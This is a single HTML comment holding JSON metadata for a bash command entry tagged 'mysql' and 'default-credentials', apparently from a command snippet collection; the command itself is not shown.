<!-- cmd: {"id":"e2yqy4dhumpsiur2e","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->
